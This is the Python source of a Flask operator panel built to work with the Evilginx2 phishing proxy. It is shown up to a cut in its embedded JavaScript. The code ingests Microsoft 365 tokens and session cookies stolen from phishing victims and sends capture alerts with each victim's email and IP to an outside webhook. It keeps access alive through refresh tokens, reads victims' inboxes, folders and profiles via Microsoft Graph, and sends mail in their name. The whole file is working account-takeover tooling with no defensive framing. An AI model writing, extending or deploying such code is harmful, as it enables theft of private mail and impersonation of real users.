# app.py - Evilginx2 Phishlet Compatible - Full Email Access with Token & Session Cookie Support
import os
import re
import json
import base64
import logging
from datetime import datetime, timedelta
from functools import wraps
from urllib.parse import urlparse, parse_qs
from http.cookies import SimpleCookie

import requests
from flask import (
    Flask, render_template_string, request, jsonify, session, 
    make_response, redirect, url_for, send_from_directory
)
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_session import Session          # <-- ADDED for server-side sessions
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# ========== Configuration ==========
class Config:
    SECRET_KEY = os.environ.get('SECRET_KEY', os.urandom(24).hex())
    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE', 'False').lower() == 'true'
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = 'Lax'
    PERMANENT_SESSION_LIFETIME = timedelta(hours=2)
    GRAPH_API_ENDPOINT = 'https://graph.microsoft.com/v1.0'
    
    # Server-side session configuration (fixes cookie size limit)
    SESSION_TYPE = 'filesystem'
    SESSION_PERMANENT = False
    SESSION_USE_SIGNER = True
    SESSION_FILE_DIR = './flask_sessions'
    
    # Multiple client IDs for different token types
    CLIENT_IDS = {
        'azure_cli': '1950a258-227b-4e31-a9cf-717495945fc2',
        'office': 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
        'teams': '5e3ce6c0-2b1f-4285-8d4b-75ee78787346',
        'onedrive': 'ab9b8c07-8f02-4f72-87fa-80105867a763',
        'outlook': 'd3590ed6-52b3-4102-aeff-aad2292ab01c'
    }
    
    # Outlook Web URLs
    OUTLOOK_URLS = {
        'web': 'https://outlook.office.com/mail/inbox',
        'web2': 'https://outlook.office365.com/mail/inbox',
        'owa': 'https://outlook.office.com/owa/?path=/mail/inbox',
        'legacy': 'https://outlook.live.com/mail/inbox'
    }
    
    REQUEST_TIMEOUT = 30
    MAX_EMAILS = int(os.environ.get('MAX_EMAILS', 100))
    LOG_LEVEL = os.environ.get('LOG_LEVEL', 'INFO')
    
    # Token capture endpoint
    TOKEN_CAPTURE_ENDPOINT = '/__capture_tokens'

# Initialize Flask app
app = Flask(__name__)
app.config.from_object(Config)

# Initialize server-side session (must be after config)
Session(app)

# Rate limiter
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://"
)

# Logging setup
logging.basicConfig(
    level=getattr(logging, Config.LOG_LEVEL),
    format='%(asctime)s %(levelname)s %(name)s %(message)s'
)
logger = logging.getLogger(__name__)

# Store captured data
captured_data = []

# ========== Token Manager Class ==========
class TokenManager:
    """Manages token operations including refresh and validation"""
    
    @staticmethod
    def decode_jwt(token: str) -> dict:
        """Safely decode JWT payload without verification."""
        try:
            parts = token.split('.')
            if len(parts) < 2:
                return {}
            payload = parts[1]
            payload += '=' * ((4 - len(payload) % 4) % 4)
            decoded = base64.b64decode(payload)
            return json.loads(decoded)
        except Exception as e:
            logger.warning(f"JWT decode failed: {e}")
            return {}
    
    @staticmethod
    def is_token_expired(token_info: dict) -> bool:
        """Check if token is expired (with 5 minute buffer)"""
        if not token_info or 'exp' not in token_info:
            return True
        exp = token_info.get('exp', 0)
        current_time = datetime.utcnow().timestamp()
        buffer_time = 300
        return exp < (current_time + buffer_time)
    
    @staticmethod
    def refresh_access_token(refresh_token: str, tenant_id: str = 'common', client_id: str = None) -> dict:
        """Refresh access token using various client IDs"""
        if not refresh_token:
            return {'success': False, 'error': 'No refresh token provided'}
        
        if not client_id:
            client_id = Config.CLIENT_IDS['azure_cli']
        
        token_url = f'https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token'
        
        scope_combinations = [
            'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access',
            'https://graph.microsoft.com/.default openid email profile offline_access',
            'Mail.Read Mail.Send User.Read offline_access'
        ]
        
        for scopes in scope_combinations:
            data = {
                'client_id': client_id,
                'refresh_token': refresh_token,
                'grant_type': 'refresh_token',
                'scope': scopes
            }
            
            try:
                logger.info(f"Attempting token refresh with client: {client_id}")
                resp = requests.post(token_url, data=data, timeout=Config.REQUEST_TIMEOUT)
                
                if resp.status_code == 200:
                    tokens = resp.json()
                    logger.info("Token refresh successful")
                    return {
                        'success': True,
                        'access_token': tokens.get('access_token'),
                        'refresh_token': tokens.get('refresh_token', refresh_token),
                        'expires_in': tokens.get('expires_in', 3600),
                    }
            except Exception as e:
                logger.error(f"Refresh error with client {client_id}: {e}")
                continue
        
        return {'success': False, 'error': 'All refresh attempts failed'}
    
    @staticmethod
    def get_token_scopes(token_info: dict) -> list:
        """Extract scopes from token"""
        scp = token_info.get('scp', '')
        if scp:
            return scp.split(' ')
        return []
    
    @staticmethod
    def has_email_permission(scopes: list) -> dict:
        """Check if token has email read/send permissions"""
        return {
            'can_read': 'Mail.Read' in scopes or 'Mail.ReadWrite' in scopes,
            'can_send': 'Mail.Send' in scopes or 'Mail.ReadWrite' in scopes,
            'can_read_all': 'Mail.Read.All' in scopes,
            'can_send_all': 'Mail.Send.All' in scopes
        }
    
    @staticmethod
    def parse_cookie_string(cookie_string: str) -> dict:
        """Parse cookie string into dictionary"""
        cookies = {}
        if cookie_string:
            try:
                simple_cookie = SimpleCookie()
                simple_cookie.load(cookie_string)
                for key, morsel in simple_cookie.items():
                    cookies[key] = morsel.value
            except:
                for cookie in cookie_string.split(';'):
                    if '=' in cookie:
                        key, value = cookie.strip().split('=', 1)
                        cookies[key] = value
        return cookies
    
    @staticmethod
    def get_important_cookies(cookie_dict: dict) -> dict:
        """Extract important authentication cookies"""
        important_names = ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'RPSSecAuth', 
                          'MSISAuth', 'MSISAuthenticated', 'fpc', 'x-ms-gateway-slice']
        return {k: v for k, v in cookie_dict.items() if k in important_names}
    
    @staticmethod
    def cookies_to_session(cookies: dict) -> requests.Session:
        """Convert cookie dict to requests Session"""
        session = requests.Session()
        for name, value in cookies.items():
            session.cookies.set(name, value)
        return session

# ========== Helper Functions ==========
def require_auth(f):
    """Decorator to ensure valid authentication (token or session)"""
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'access_token' in session:
            token_info = session.get('token_info', {})
            if TokenManager.is_token_expired(token_info):
                refresh_token = session.get('refresh_token')
                if refresh_token:
                    logger.info("Token expired, attempting auto-refresh")
                    result = TokenManager.refresh_access_token(
                        refresh_token, 
                        token_info.get('tid', 'common')
                    )
                    if result['success']:
                        session['access_token'] = result['access_token']
                        session['refresh_token'] = result['refresh_token']
                        session['token_info'] = TokenManager.decode_jwt(result['access_token'])
                        session['scopes'] = TokenManager.get_token_scopes(session['token_info'])
                        session.modified = True
                        logger.info("Token auto-refreshed successfully")
                    else:
                        return jsonify({'error': 'Token expired and auto-refresh failed'}), 401
                else:
                    return jsonify({'error': 'Token expired. No refresh token available.'}), 401
        
        elif 'session_cookies' not in session:
            return jsonify({'error': 'No authentication loaded. Please load a token or session cookies.'}), 401
        
        return f(*args, **kwargs)
    return decorated

def make_graph_request(endpoint: str, method='GET', data=None, retry_count=0):
    """Make authenticated request to Microsoft Graph using token or session cookies"""
    
    # Try using token first
    if 'access_token' in session:
        access_token = session.get('access_token')
        url = f"{Config.GRAPH_API_ENDPOINT}/{endpoint.lstrip('/')}"
        headers = {'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'}
        
        try:
            if method.upper() == 'GET':
                resp = requests.get(url, headers=headers, timeout=Config.REQUEST_TIMEOUT)
            elif method.upper() == 'POST':
                resp = requests.post(url, headers=headers, json=data, timeout=Config.REQUEST_TIMEOUT)
            else:
                return None, f'Unsupported method {method}'
            
            if resp.status_code == 200:
                return resp.json(), None
            elif resp.status_code == 201:
                return resp.json(), None
            elif resp.status_code == 202:
                return {'success': True}, None
            elif resp.status_code == 401 and retry_count < 2:
                refresh_token = session.get('refresh_token')
                if refresh_token:
                    token_info = session.get('token_info', {})
                    result = TokenManager.refresh_access_token(refresh_token, token_info.get('tid', 'common'))
                    if result['success']:
                        session['access_token'] = result['access_token']
                        session['refresh_token'] = result['refresh_token']
                        session['token_info'] = TokenManager.decode_jwt(result['access_token'])
                        session.modified = True
                        return make_graph_request(endpoint, method, data, retry_count + 1)
                return None, 'Token expired and refresh failed'
            else:
                logger.warning(f"Graph API error {resp.status_code}: {resp.text[:200]}")
                return None, f"Graph API returned {resp.status_code}"
        except requests.RequestException as e:
            logger.error(f"Graph request failed: {e}")
            return None, str(e)
    
    # Fallback to session cookies
    elif 'session_cookies' in session:
        session_cookies = session.get('session_cookies', {})
        url = f"{Config.GRAPH_API_ENDPOINT}/{endpoint.lstrip('/')}"
        headers = {'Content-Type': 'application/json'}
        
        try:
            if method.upper() == 'GET':
                resp = requests.get(url, headers=headers, cookies=session_cookies, timeout=Config.REQUEST_TIMEOUT)
            elif method.upper() == 'POST':
                resp = requests.post(url, headers=headers, json=data, cookies=session_cookies, timeout=Config.REQUEST_TIMEOUT)
            else:
                return None, f'Unsupported method {method}'
            
            if resp.status_code == 200:
                return resp.json(), None
            elif resp.status_code == 201:
                return resp.json(), None
            elif resp.status_code == 202:
                return {'success': True}, None
            else:
                logger.warning(f"Graph API error {resp.status_code}: {resp.text[:200]}")
                return None, f"Graph API returned {resp.status_code}"
        except requests.RequestException as e:
            logger.error(f"Graph request failed: {e}")
            return None, str(e)
    
    return None, 'No authentication method available'

# ========== Evilginx2 Capture Endpoint ==========
@app.route('/__capture_tokens', methods=['POST'])
def capture_tokens():
    """Endpoint for Evilginx2 to send captured tokens and session cookies"""
    try:
        token_data = request.get_json(force=True)
        if not token_data:
            return jsonify({'status': 'error', 'message': 'No data'}), 400
        
        captured = {
            'timestamp': datetime.utcnow().isoformat(),
            'source_ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent'),
            'tokens': {},
            'cookies': {},
            'important_cookies': {},
            'raw_data': token_data
        }
        
        # Extract tokens
        if 'tokens' in token_data:
            captured['tokens'] = token_data['tokens']
        elif 'access_token' in token_data:
            captured['tokens']['access_token'] = token_data.get('access_token')
            captured['tokens']['refresh_token'] = token_data.get('refresh_token')
            captured['tokens']['id_token'] = token_data.get('id_token')
            captured['tokens']['code'] = token_data.get('code')
            captured['tokens']['scope'] = token_data.get('scope')
        
        # Extract cookies
        if 'cookies' in token_data and token_data['cookies']:
            captured['cookies'] = TokenManager.parse_cookie_string(token_data['cookies'])
            captured['important_cookies'] = TokenManager.get_important_cookies(captured['cookies'])
        elif 'important_cookies' in token_data and token_data['important_cookies']:
            if isinstance(token_data['important_cookies'], dict):
                captured['important_cookies'] = token_data['important_cookies']
            else:
                captured['important_cookies'] = TokenManager.parse_cookie_string(token_data['important_cookies'])
        
        # Decode token if present
        if captured['tokens'].get('access_token'):
            token_info = TokenManager.decode_jwt(captured['tokens']['access_token'])
            captured['decoded'] = token_info
            captured['email'] = token_info.get('unique_name') or token_info.get('email')
            captured['scopes'] = TokenManager.get_token_scopes(token_info)
            captured['email_perms'] = TokenManager.has_email_permission(captured['scopes'])
            captured['auth_type'] = 'token'
        elif captured.get('important_cookies'):
            captured['email'] = 'session_auth'
            captured['scopes'] = ['session_cookies']
            captured['email_perms'] = {'can_read': True, 'can_send': False}
            captured['auth_type'] = 'session'
        
        # Store captured data
        captured_data.append(captured)
        
        logger.info(f"Data captured from {request.remote_addr}: Type={captured['auth_type']}, Email={captured.get('email', 'Unknown')}")
        
        # Send webhook notification
        if os.environ.get('WEBHOOK_URL'):
            send_webhook_notification(captured)
        
        return jsonify({'status': 'success', 'message': 'Data captured'}), 200
        
    except Exception as e:
        logger.exception("Capture failed")
        return jsonify({'status': 'error', 'message': str(e)}), 500

def send_webhook_notification(captured):
    """Send captured data to webhook"""
    webhook_url = os.environ.get('WEBHOOK_URL')
    if not webhook_url:
        return
    
    email_perms = captured.get('email_perms', {})
    has_tokens = bool(captured.get('tokens', {}).get('access_token'))
    has_session = bool(captured.get('important_cookies'))
    
    msg = {
        'text': f"""
🔐 [Fluxxset] CAPTURED DATA

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 Type: {'Tokens + Session' if has_tokens and has_session else 'Tokens' if has_tokens else 'Session Cookies'}
👤 User: {captured.get('email', 'Unknown')}
📧 Email Access: {'Yes' if email_perms.get('can_read') else 'No'}
✉️ Send Email: {'Yes' if email_perms.get('can_send') else 'No'}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🕐 Time: {captured.get('timestamp')}
🌐 Source IP: {captured.get('source_ip')}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 Scopes: {', '.join(captured.get('scopes', [])[:5])}
🔗 Inbox Link: {Config.OUTLOOK_URLS['web']}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """
    }
    
    try:
        requests.post(webhook_url, json=msg, timeout=5)
    except Exception as e:
        logger.error(f"Webhook failed: {e}")

# ========== Routes ==========
@app.route('/')
def index():
    """Main dashboard"""
    return render_template_string(HTML_TEMPLATE)

@app.route('/health')
def health():
    return jsonify({'status': 'ok', 'timestamp': datetime.utcnow().isoformat()})

@app.route('/go/inbox')
def go_to_inbox():
    """Redirect to Outlook inbox using session cookies if available"""
    if 'session_cookies' in session:
        cookies = session.get('session_cookies', {})
        response = make_response(redirect(Config.OUTLOOK_URLS['web']))
        for name, value in cookies.items():
            response.set_cookie(name, value, domain='.office.com', path='/')
        return response
    return redirect(Config.OUTLOOK_URLS['web'])

@app.route('/api/refresh_token', methods=['POST'])
@limiter.limit("20 per minute")
def refresh_token():
    """Manually refresh the access token using stored refresh_token"""
    if 'refresh_token' not in session or not session['refresh_token']:
        return jsonify({'success': False, 'error': 'No refresh token available'}), 400
    
    if 'token_info' not in session or not session['token_info']:
        return jsonify({'success': False, 'error': 'No token info available'}), 400
    
    tenant_id = session['token_info'].get('tid', 'common')
    result = TokenManager.refresh_access_token(session['refresh_token'], tenant_id)
    
    if result['success']:
        session['access_token'] = result['access_token']
        session['refresh_token'] = result['refresh_token']
        session['token_info'] = TokenManager.decode_jwt(result['access_token'])
        session['scopes'] = TokenManager.get_token_scopes(session['token_info'])
        session['email_perms'] = TokenManager.has_email_permission(session['scopes'])
        session.modified = True
        
        expires_at = (datetime.utcnow() + timedelta(seconds=result.get('expires_in', 3600))).timestamp() * 1000
        
        return jsonify({
            'success': True,
            'access_token': result['access_token'],
            'expires_in': result.get('expires_in', 3600),
            'expires_at': expires_at
        })
    else:
        return jsonify({'success': False, 'error': result.get('error', 'Refresh failed')}), 401

@app.route('/api/captured_data')
def get_captured_data():
    """Get list of captured data"""
    return jsonify({
        'count': len(captured_data),
        'items': [{
            'timestamp': d['timestamp'],
            'email': d.get('email'),
            'auth_type': d.get('auth_type'),
            'scopes': d.get('scopes', [])[:5],
            'has_email_access': d.get('email_perms', {}).get('can_read', False),
            'has_tokens': bool(d.get('tokens', {}).get('access_token')),
            'has_session': bool(d.get('important_cookies'))
        } for d in captured_data[-20:]]
    })

@app.route('/api/load_auth', methods=['POST'])
@limiter.limit("10 per minute")
def load_auth():
    """Load authentication data (token or session cookies) from Evilginx2 capture"""
    try:
        data = request.get_json(force=True)
        if not data:
            return jsonify({'success': False, 'error': 'Missing JSON body'}), 400

        session.clear()
        session.permanent = True

        # ---- Extract access_token and refresh_token from various formats ----
        access_token = None
        refresh_token = None

        # Direct top-level keys (your JSON structure)
        if 'access_token' in data:
            access_token = data['access_token']
            refresh_token = data.get('refresh_token')
        # Nested under 'tokens' (common in some phishlets)
        elif 'tokens' in data and isinstance(data['tokens'], dict):
            access_token = data['tokens'].get('access_token')
            refresh_token = data['tokens'].get('refresh_token')
        # Nested under 'raw_response' (Evilginx2 device_code flow)
        elif 'raw_response' in data and isinstance(data['raw_response'], dict):
            access_token = data['raw_response'].get('access_token')
            refresh_token = data['raw_response'].get('refresh_token')
        # Fallback: look for any string that looks like a JWT
        else:
            for key, value in data.items():
                if isinstance(value, str) and value.count('.') == 2 and len(value) > 100:
                    access_token = value
                    refresh_token = data.get('refresh_token')
                    break

        if access_token:
            token_info = TokenManager.decode_jwt(access_token)
            if not token_info:
                return jsonify({'success': False, 'error': 'Invalid JWT token'}), 400

            scopes = TokenManager.get_token_scopes(token_info)
            email_perms = TokenManager.has_email_permission(scopes)

            # Store in server-side session (now safe)
            session['auth_type'] = 'token'
            session['access_token'] = access_token
            session['refresh_token'] = refresh_token
            session['token_info'] = token_info
            session['scopes'] = scopes
            session['email_perms'] = email_perms
            session.modified = True

            user_email = token_info.get('unique_name') or token_info.get('email', 'N/A')
            logger.info(f"Token loaded for user: {user_email}")

            # Test email access
            test_result = test_email_access()

            return jsonify({
                'success': True,
                'auth_type': 'token',
                'token_info': {
                    'name': token_info.get('name', 'N/A'),
                    'email': user_email,
                    'expires_at': token_info.get('exp', 0) * 1000,
                    'scopes': scopes,
                    'can_read_emails': email_perms['can_read'],
                    'can_send_emails': email_perms['can_send']
                },
                'test_result': test_result
            })

        # ---- Extract session cookies ----
        cookies = None
        if 'cookies' in data:
            cookies = data['cookies'] if isinstance(data['cookies'], dict) else TokenManager.parse_cookie_string(data['cookies'])
        elif 'important_cookies' in data:
            cookies = data['important_cookies'] if isinstance(data['important_cookies'], dict) else TokenManager.parse_cookie_string(data['important_cookies'])

        if cookies:
            session['auth_type'] = 'session'
            session['session_cookies'] = cookies
            session['important_cookies'] = TokenManager.get_important_cookies(cookies)
            session['email_perms'] = {'can_read': True, 'can_send': False}
            session.modified = True

            logger.info(f"Session cookies loaded: {list(cookies.keys())}")
            test_result = test_email_access()

            return jsonify({
                'success': True,
                'auth_type': 'session',
                'token_info': {
                    'name': 'Session Authentication',
                    'email': data.get('email', 'session_auth'),
                    'expires_at': None,
                    'scopes': ['session_cookies'],
                    'can_read_emails': True,
                    'can_send_emails': False
                },
                'test_result': test_result,
                'warning': 'Session cookies loaded. You can read emails but sending requires token.'
            })

        return jsonify({'success': False, 'error': 'No access_token or session cookies found'}), 400

    except Exception as e:
        logger.exception("Load failed")
        return jsonify({'success': False, 'error': str(e)}), 500

def test_email_access():
    """Test if we can access emails with current auth"""
    try:
        data, err = make_graph_request('me/mailFolders/inbox/messages?$top=1')
        if data and 'value' in data:
            return {'success': True, 'message': 'Email access confirmed'}
        return {'success': False, 'message': err or 'No email access'}
    except Exception as e:
        return {'success': False, 'message': str(e)}

@app.route('/api/emails', methods=['GET'])
@require_auth
def get_emails():
    """Get emails from inbox"""
    top = min(int(request.args.get('top', 50)), Config.MAX_EMAILS)
    folder = request.args.get('folder', 'inbox')
    
    if session.get('auth_type') == 'token':
        if not session.get('email_perms', {}).get('can_read', False):
            return jsonify({'error': 'Token does not have Mail.Read permission'}), 403
    
    url = f"me/mailFolders/{folder}/messages?$top={top}&$select=subject,from,receivedDateTime,bodyPreview,id,isRead,importance&$orderby=receivedDateTime desc"
    
    data, err = make_graph_request(url)
    if err:
        return jsonify({'error': err}), 500
    
    if data and 'value' in data:
        for email in data['value']:
            email['outlook_web_link'] = f"{Config.OUTLOOK_URLS['web']}/id/{email['id']}"
    
    return jsonify(data)

@app.route('/api/emails/<email_id>', methods=['GET'])
@require_auth
def get_email_details(email_id):
    """Get full email details"""
    if session.get('auth_type') == 'token':
        if not session.get('email_perms', {}).get('can_read', False):
            return jsonify({'error': 'Token does not have Mail.Read permission'}), 403
    
    data, err = make_graph_request(f"me/messages/{email_id}?$select=subject,from,receivedDateTime,body,toRecipients,ccRecipients,importance,hasAttachments")
    if err:
        return jsonify({'error': err}), 500
    
    return jsonify(data)

@app.route('/api/emails/send', methods=['POST'])
@require_auth
def send_email():
    """Send an email (requires token with Mail.Send)"""
    if session.get('auth_type') != 'token':
        return jsonify({'error': 'Send email requires token authentication with Mail.Send permission'}), 403
    
    if not session.get('email_perms', {}).get('can_send', False):
        return jsonify({'error': 'Token does not have Mail.Send permission'}), 403
    
    email_data = request.json
    if not email_data:
        return jsonify({'error': 'No email data provided'}), 400
    
    if not email_data.get('to') or not email_data.get('subject') or not email_data.get('body'):
        return jsonify({'error': 'Missing required fields: to, subject, body'}), 400
    
    message = {
        "subject": email_data.get('subject'),
        "body": {
            "contentType": "HTML",
            "content": email_data.get('body', '')
        },
        "toRecipients": [
            {"emailAddress": {"address": recipient.strip()}}
            for recipient in email_data.get('to', []) if recipient.strip()
        ]
    }
    
    if email_data.get('cc'):
        message["ccRecipients"] = [
            {"emailAddress": {"address": recipient.strip()}}
            for recipient in email_data['cc'] if recipient.strip()
        ]
    
    data, err = make_graph_request("me/sendMail", method='POST', data={"message": message, "saveToSentItems": True})
    if err:
        return jsonify({'error': err}), 500
    
    return jsonify({'success': True, 'message': 'Email sent successfully'})

@app.route('/api/mail_folders', methods=['GET'])
@require_auth
def get_mail_folders():
    """Get all mail folders"""
    if session.get('auth_type') == 'token':
        if not session.get('email_perms', {}).get('can_read', False):
            return jsonify({'error': 'Token does not have Mail.Read permission'}), 403
    
    data, err = make_graph_request('me/mailFolders?$select=displayName,id,totalItemCount,unreadItemCount')
    if err:
        return jsonify({'error': err}), 500
    return jsonify(data)

@app.route('/api/profile')
@require_auth
def get_profile():
    """Get user profile"""
    data, err = make_graph_request('me?$select=displayName,mail,userPrincipalName,jobTitle,department,officeLocation,mobilePhone')
    if err:
        return jsonify({'error': err}), 500
    return jsonify(data)

@app.route('/api/scopes')
@require_auth
def get_scopes():
    """Return the scopes granted and capabilities"""
    scopes = session.get('scopes', [])
    email_perms = session.get('email_perms', {})
    auth_type = session.get('auth_type', 'unknown')
    
    return jsonify({
        'auth_type': auth_type,
        'scopes': scopes,
        'capabilities': {
            'read_emails': email_perms.get('can_read', False),
            'send_emails': email_perms.get('can_send', False),
            'read_profile': True if auth_type == 'session' else ('User.Read' in scopes or 'User.Read.All' in scopes),
            'read_users': 'User.Read.All' in scopes,
            'read_groups': 'Group.Read.All' in scopes or 'Group.ReadWrite.All' in scopes
        }
    })

@app.errorhandler(429)
def ratelimit_handler(e):
    return jsonify(error="Rate limit exceeded. Please slow down."), 429

# ========== HTML Template ==========
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Token Manager - Session & Token Support</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        .card {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            margin-bottom: 20px;
            overflow: hidden;
        }
        .card-header {
            background: linear-gradient(135deg, #0f3460 0%, #16213e 100%);
            color: white;
            padding: 20px 30px;
        }
        .card-header h1 { font-size: 24px; margin-bottom: 5px; }
        .card-header p { opacity: 0.9; font-size: 14px; }
        .card-body { padding: 30px; }
        .auth-input {
            width: 100%;
            min-height: 250px;
            padding: 15px;
            font-family: monospace;
            font-size: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            resize: vertical;
        }
        .btn {
            background: #0f3460;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            margin-top: 15px;
            margin-right: 10px;
            transition: all 0.2s;
        }
        .btn:hover { background: #1a4a7a; transform: translateY(-1px); }
        .btn-success { background: #28a745; }
        .btn-success:hover { background: #218838; }
        .btn-outlook { background: #0078d4; }
        .btn-outlook:hover { background: #005a9e; }
        .btn-captured { background: #6c757d; }
        .tabs {
            display: flex;
            gap: 10px;
            margin: 25px 0 15px;
            border-bottom: 2px solid #e0e0e0;
            flex-wrap: wrap;
        }
        .tab {
            padding: 8px 16px;
            cursor: pointer;
            background: none;
            border: none;
            font-size: 15px;
            color: #666;
            transition: all 0.2s;
        }
        .tab:hover { color: #0f3460; }
        .tab.active {
            color: #0f3460;
            border-bottom: 3px solid #0f3460;
        }
        .result-area {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            max-height: 600px;
            overflow-y: auto;
        }
        .email-item, .result-item {
            background: white;
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 8px;
            border-left: 4px solid #0f3460;
            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
            cursor: pointer;
            transition: all 0.2s;
        }
        .email-item:hover { transform: translateX(5px); box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        .email-subject { font-weight: 600; margin-bottom: 4px; color: #333; }
        .email-from { font-size: 12px; color: #555; margin-bottom: 4px; }
        .email-preview { font-size: 12px; color: #777; margin-top: 8px; }
        .email-date { font-size: 11px; color: #999; }
        .info-box {
            background: #e8f0fe;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 16px;
            font-size: 13px;
        }
        .success-box {
            background: #d4edda;
            border-left: 4px solid #28a745;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 16px;
        }
        .warning-box {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 16px;
        }
        .error-box {
            background: #f8d7da;
            border-left: 4px solid #dc3545;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 16px;
            color: #721c24;
        }
        .button-group {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin: 15px 0;
        }
        .compose-modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
        }
        .modal-content {
            background: white;
            margin: 5% auto;
            padding: 20px;
            border-radius: 12px;
            width: 90%;
            max-width: 600px;
            max-height: 80%;
            overflow-y: auto;
        }
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #e0e0e0;
        }
        .close { font-size: 28px; cursor: pointer; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 5px; font-weight: 600; }
        .form-group input, .form-group textarea, .form-group select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
        }
        .status-badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 11px;
            margin-left: 10px;
        }
        .status-online { background: #28a745; color: white; }
        .status-offline { background: #dc3545; color: white; }
        .status-session { background: #ffc107; color: #333; }
        .outlook-link {
            background: #0078d4;
            color: white;
            text-decoration: none;
            padding: 8px 16px;
            border-radius: 6px;
            display: inline-block;
            font-size: 13px;
        }
        .outlook-link:hover { background: #005a9e; }
        pre {
            background: #f1f1f1;
            padding: 10px;
            border-radius: 6px;
            overflow-x: auto;
            font-size: 11px;
            margin-top: 10px;
        }
        .session-cookie-input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            font-family: monospace;
            font-size: 11px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="card-header">
            <h1>🔐 Advanced Token & Session Manager</h1>
            <p>Load captured tokens OR session cookies to access Outlook mailbox</p>
        </div>
        <div class="card-body">
            <textarea id="authData" class="auth-input" placeholder='Paste captured data from Evilginx2...'>{
  "access_token": "eyJ0eXAi...",
  "refresh_token": "1.AU8...",
  "email": "user@example.com"
}</textarea>
            
            <div class="button-group">
                <button class="btn" onclick="loadAuth()">🔑 Load Token/Session</button>
                <button class="btn btn-success" onclick="refreshToken()">🔄 Refresh Token</button>
                <button class="btn btn-outlook" onclick="openOutlook()">📧 Open Outlook Inbox</button>
                <button class="btn" onclick="openComposeModal()">✏️ Compose Email</button>
                <button class="btn btn-captured" onclick="showCaptured()">📋 Show Captured</button>
            </div>
            
            <div id="authInfo"></div>
            
            <div class="tabs">
                <button class="tab active" onclick="switchTab('inbox')">📧 Inbox</button>
                <button class="tab" onclick="switchTab('folders')">📂 Folders</button>
                <button class="tab" onclick="switchTab('profile')">👤 Profile</button>
                <button class="tab" onclick="switchTab('scopes')">🔐 Permissions</button>
            </div>
            <div id="inboxTab" class="result-area">Load authentication to view emails...</div>
            <div id="foldersTab" class="result-area" style="display:none;"></div>
            <div id="profileTab" class="result-area" style="display:none;"></div>
            <div id="scopesTab" class="result-area" style="display:none;"></div>
        </div>
    </div>
</div>

<!-- Compose Email Modal -->
<div id="composeModal" class="compose-modal">
    <div class="modal-content">
        <div class="modal-header">
            <h2>✏️ Compose New Email</h2>
            <span class="close" onclick="closeComposeModal()">&times;</span>
        </div>
        <form id="composeForm">
            <div class="form-group">
                <label>To:</label>
                <input type="email" id="composeTo" required placeholder="recipient@example.com">
            </div>
            <div class="form-group">
                <label>CC (optional):</label>
                <input type="email" id="composeCc" placeholder="cc@example.com">
            </div>
            <div class="form-group">
                <label>Subject:</label>
                <input type="text" id="composeSubject" required>
            </div>
            <div class="form-group">
                <label>Body:</label>
                <textarea id="composeBody" rows="10" required></textarea>
            </div>
            <button type="submit" class="btn btn-success">📤 Send Email</button>
        </form>
    </div>
</div>

<script>
    let currentAuth = null;
    let authType = null;
    let emailPermissions = { can_read: false, can_send: false };
    let autoRefreshInterval = null;
    
    async function fetchWithCreds(url, options = {}) {
        options.credentials = 'same-origin';
        const response = await fetch(url, options);
        if (response.status === 401) {
            showMessage('Authentication expired. Attempting refresh...', 'warning');
            if (authType === 'token') {
                const refreshResult = await refreshToken();
                if (refreshResult && refreshResult.success) {
                    return fetchWithCreds(url, options);
                }
            }
        }
        return response;
    }
    
    async function loadAuth() {
        const raw = document.getElementById('authData').value;
        try {
            let data = JSON.parse(raw);
            
            // Handle Evilginx2 nested format
            if (data.raw_response) {
                data = {
